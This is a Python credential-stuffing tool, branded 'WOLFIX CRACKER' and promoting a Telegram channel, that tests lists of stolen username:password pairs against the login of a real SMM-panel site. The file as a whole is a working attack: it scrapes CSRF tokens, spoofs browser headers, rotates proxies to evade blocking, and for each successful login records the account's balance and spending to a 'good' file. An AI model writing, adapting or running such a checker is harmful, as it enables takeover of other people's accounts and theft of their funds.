import requests
from bs4 import BeautifulSoup
import urllib3
import time
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock 
import random

from pystyle import Colors, Colorate, Center 
from colorama import init 

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = """


▗▖ ▗▖ ▗▄▖ ▗▖   ▗▄▄▄▖▗▄▄▄▖▗▖  ▗▖     ▗▄▄▖▗▄▄▖  ▗▄▖  ▗▄▄▖▗▖ ▗▖▗▄▄▄▖▗▄▄▖ 
▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌     █   ▝▚▞▘     ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌▗▞▘▐▌   ▐▌ ▐▌
▐▌ ▐▌▐▌ ▐▌▐▌   ▐▛▀▀▘  █    ▐▌      ▐▌   ▐▛▀▚▖▐▛▀▜▌▐▌   ▐▛▚▖ ▐▛▀▀▘▐▛▀▚▖
▐▙█▟▌▝▚▄▞▘▐▙▄▄▖▐▌   ▗▄█▄▖▗▞▘▝▚▖    ▝▚▄▄▖▐▌ ▐▌▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌▐▙▄▄▖▐▌ ▐▌
                             t.me/secabuser                               

"""

class Counter:
    def __init__(self):
        self.good = 0
        self.bad = 0
        self.Error = 0
        self.check = 0
        self.start = time.time()
        self.lock = Lock()

    def add_good(self):
        with self.lock:
            self.good += 1
            self.check += 1
    
    def add_bad(self):
        with self.lock:
            self.bad += 1
            self.check += 1 # Tel Channel -> t.me/secabuser

    def add_Error(self):
        with self.lock:
            self.Error += 1
            self.check += 1

    def stats(self, total):
        with self.lock:
            elap = time.time() - self.start
            speed = self.check / elap if elap > 0 else 0
            
            return (
                self.good,
                self.bad,
                self.Error,
                speed,
                self.check,
                total
            )

counts = Counter()

class Log:
    lock = Lock() 
    good_f = "good.txt"
    bad_f = "bad.txt" # Tel Channel -> t.me/secabuser
    err_f = "error.txt"

    @staticmethod
    def wr_file(fname, msg):
        with Log.lock:
            try:
                with open(fname, "a", encoding="utf-8") as f:
                    f.write(msg + "\n")
            except IOError as e:
                print(f"[Error] File Write Error -> Could not write to {fname}: {e}")

    @staticmethod
    def ok_log(info, data=None):
        msg = info
        if data:
            msg += f" | {data}"
        Log.wr_file(Log.good_f, msg)
        counts.add_good()
        
    @staticmethod
    def bad_log(info): 
        Log.wr_file(Log.bad_f, info) # Tel Channel -> t.me/secabuser
        counts.add_bad()

    @staticmethod
    def err_log(info, err_msg=""):
        msg = info
        if err_msg:
            msg += f" | Error: {err_msg}"
        Log.wr_file(Log.err_f, msg)
        counts.add_Error()

    @staticmethod
    def info(msg):
        print(Colorate.Diagonal(Colors.blue_to_white, msg))

    @staticmethod
    def prep_logs():
        with Log.lock:
            if os.path.exists(Log.good_f):
                os.remove(Log.good_f)
            if os.path.exists(Log.bad_f):
                os.remove(Log.bad_f) # Tel Channel -> t.me/secabuser
            if os.path.exists(Log.err_f):
                os.remove(Log.err_f)

class Tester:
    def __init__(self, pair, proxy=None):
        self.user, self.passw = pair.split(':', 1)
        self.sess = requests.Session()
        self.log_url = "https://smmwolfix.com/"
        self.dash_url = "https://smmwolfix.com/dashboard"
        self.proxy = proxy # Tel Channel -> t.me/secabuser

        self.headers = {
            'Host': 'smmwolfix.com',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'sec-ch-ua': '"Opera GX";v="120", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Origin': 'https://smmwolfix.com',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/120.0.0.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Referer': 'https://smmwolfix.com/',
            'Accept-Language': 'en-US,en;q=0.9,de;q=0.8,vi;q=0.7,fa;q=0.6,es;q=0.5,tr;q=0.4,ru;q=0.3',
            'Accept-Encoding': 'gzip, deflate'
        }
        self.sess.headers.update(self.headers)


    def req(self, meth, url, head=None, dat=None, jsn=None, redir=True):
        req_head = self.sess.headers.copy()
        if head:
            req_head.update(head)
        
        try:
            res = self.sess.request(meth.upper(), url, headers=req_head, data=dat, json=jsn, verify=False, allow_redirects=redir, proxies=self.proxy)
            res.raise_for_status()
            
            time.sleep(random.uniform(0.05, 0.15)) 
            return res
        except requests.exceptions.RequestException as e:
            Log.err_log(f"{self.user}:{self.passw}", f"Request Error via {list(self.proxy.values())[0] if self.proxy else 'Direct'}: {e}")
            return None


    def get_csrf(self):
        head_get = self.headers.copy()
        if 'Content-Type' in head_get:
            del head_get['Content-Type'] # Tel Channel -> t.me/secabuser

        res = self.req('GET', self.log_url, head=head_get)
        if not res or res.status_code != 200:
            if res:
                Log.err_log(f"{self.user}:{self.passw}", f"Failed to get login page (Status: {res.status_code})")
            return None
        
        soup = BeautifulSoup(res.text, 'html.parser')
        csrf_in = soup.find('input', {'name': '_csrf'})
        
        if csrf_in:
            return csrf_in['value']
        else:
            Log.err_log(f"{self.user}:{self.passw}", "CSRF token not found on page HTML.")
            return None

    def login(self, csrf):
        pay = {
            '_csrf': csrf,
            'LoginForm[username]': self.user, # Tel Channel -> t.me/secabuser
            'LoginForm[password]': self.passw
        }

        head_post = self.headers.copy()
        head_post['Content-Type'] = 'application/x-www-form-urlencoded'

        res = self.req('POST', self.log_url, head=head_post, dat=pay, redir=True)
        
        if not res:
            return False, ""

        if res.status_code == 200 and ("Logout" in res.text or "/dashboard" in res.url or "my-account" in res.url):
            return True, res.url
        elif res.status_code == 302 and ("/dashboard" in res.url or "my-account" in res.url):
             return True, res.url
        return False, res.url # Tel Channel -> t.me/secabuser

    def get_data(self):
        head_get = self.headers.copy()
        if 'Content-Type' in head_get:
            del head_get['Content-Type']

        res = self.req('GET', self.dash_url, head=head_get)
        
        data = {}
        if res and res.status_code == 200:
            soup_dash = BeautifulSoup(res.text, 'html.parser')
            
            spent_s = soup_dash.find('span', {'id': 'spentswitch', 'class': 'user-fund'})
            if spent_s:
                data['Spent'] = spent_s.text.strip()
            else:
                data['Spent'] = "N/A"

            bal_s = soup_dash.find('span', {'id': 'balanceswitch', 'class': 'user-fund'})
            if bal_s:
                data['Balance'] = bal_s.text.strip()
            else:
                data['Balance'] = "N/A" # Tel Channel -> t.me/secabuser
        else:
            Log.err_log(f"{self.user}:{self.passw}", f"failed to load dashboard for capture ( {res.status_code if res else 'No Response'}).")
        
        return data

    def proc_acc(self, delay):
        if delay > 0:
            time.sleep(delay)

        csrf = self.get_csrf()
        if not csrf:
            return 

        ok_log, url_fin = self.login(csrf) # Tel Channel -> t.me/secabuser
        
        if ok_log:
            data = self.get_data()
            data_str = ""
            if data:
                data_str = ", ".join([f"{k}: {v}" for k, v in data.items()])
            
            Log.ok_log(f"{self.user}:{self.passw}", data_str)
        else:
            Log.bad_log(f"{self.user}:{self.passw}")

    def read_file(self, fname):
        acc_list = []
        try:
            with open(fname, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        acc_list.append(line)
        except FileNotFoundError:
            Log.info(f"[Error] '{fname}' not found !") # Tel Channel -> t.me/secabuser
            sys.exit(1)
        return acc_list

def load_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and '://' in line:
                    proxies.append(line)
    except FileNotFoundError:
        Log.info(f"[Error] Proxy file '{proxy_file}' not found.")
        sys.exit(1)
    return proxies

def get_next_proxy(proxy_list, proxy_index_lock, current_index): # Tel Channel -> t.me/secabuser
    with proxy_index_lock:
        if not proxy_list:
            return None, current_index 

        proxy_url = proxy_list[current_index % len(proxy_list)]
        current_index += 1

        if proxy_url.startswith("http://") or proxy_url.startswith("https://"):
            return {'http': proxy_url, 'https': proxy_url}, current_index
        elif proxy_url.startswith("socks5://"):
            return {'http': proxy_url, 'https': proxy_url}, current_index
        else:
            Log.info(f"[Warn] Unsupported proxy format > {proxy_url}. Skipping.")
            return None, current_index

def update_status_line(total_accounts):
    good, bad, Error, speed, checked, total = counts.stats(total_accounts)
    
    sys.stdout.write('\r' + ' ' * os.get_terminal_size().columns + '\r') # Tel Channel -> t.me/secabuser
    status_msg = Colorate.Diagonal(Colors.blue_to_white, 
                                   f"Good: {good} | Bad: {bad} | Error: {Error} | Acc/s: {speed:.2f} | {checked}/{total}")
    sys.stdout.write(status_msg)
    sys.stdout.flush()

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter(BANNER))) # Tel Channel -> t.me/secabuser

    Log.prep_logs()

    combo_f = input(Colorate.Diagonal(Colors.red_to_blue, "Combo File") + " > ").strip()
    
    dummy = Tester("d:d")
    acc_list = dummy.read_file(combo_f)

    if not acc_list:
        Log.info("No accounts loaded. Exiting.") # Tel Channel -> t.me/secabuser
        sys.exit(1)

    use_proxy_input = input(Colorate.Diagonal(Colors.red_to_blue, "Use proxies? (yes/no)") + " > ").strip().lower()
    
    proxies = []
    proxy_index = 0
    proxy_index_lock = Lock()

    if use_proxy_input == 'yes':
        proxy_file = input(Colorate.Diagonal(Colors.red_to_blue, "Proxy File") + " > ").strip()
        proxies = load_proxies(proxy_file)
        if not proxies: # Tel Channel -> t.me/secabuser
            Log.info("No proxies loaded from file !")
            use_proxy_input = 'no'

    w_in = input(Colorate.Diagonal(Colors.red_to_blue, "Max Worker") + " > ").strip()
    try:
        workers = int(w_in) if w_in else 5 
        if workers < 1:
            raise ValueError
    except ValueError:
        Log.info("Invalid workers value ! - Using default of 5.")
        workers = 5

    d_in = input(Colorate.Diagonal(Colors.red_to_blue, "Sleep") + " > ").strip()
    try:
        delay_acc = float(d_in)
        if delay_acc < 0:
            raise ValueError
    except ValueError: # Tel Channel -> t.me/secabuser
        Log.info("Invalid delay value ! - Using default of 0 seconds.")
        delay_acc = 0

    os.system('cls' if os.name == 'nt' else 'clear') 
    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter(BANNER))) 
    update_status_line(len(acc_list)) 

    counts.start = time.time()

    with ThreadPoolExecutor(max_workers=workers) as exec:
        futs = []
        for pair in acc_list: # Tel Channel -> t.me/secabuser
            current_proxy_dict = None
            if use_proxy_input == 'yes' and proxies:
                current_proxy_dict, proxy_index = get_next_proxy(proxies, proxy_index_lock, proxy_index)
                if current_proxy_dict is None:
                    Log.err_log(f"{pair}", "skiped")
                    counts.add_Error() 
                    continue 
            
            futs.append(exec.submit(Tester(pair, proxy=current_proxy_dict).proc_acc, delay_acc))

        total_tasks_submitted = len(futs) 

        while counts.check < total_tasks_submitted: 
            update_status_line(len(acc_list)) 
            time.sleep(0.5)

        update_status_line(len(acc_list))
        
        for fut in as_completed(futs):
             try: # Tel Channel -> t.me/secabuser
                 fut.result()
             except Exception:
                 pass 

    print("\n") 
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter(BANNER))) 
    
    Log.info(f"--- completed ---")
    g_fin, b_fin, e_fin, s_fin, c_fin, t_fin = counts.stats(len(acc_list)) # Tel Channel -> t.me/secabuser
    Log.info(f"Good: {g_fin}, Bad: {b_fin}, Error: {e_fin}, Total Checked: {c_fin}")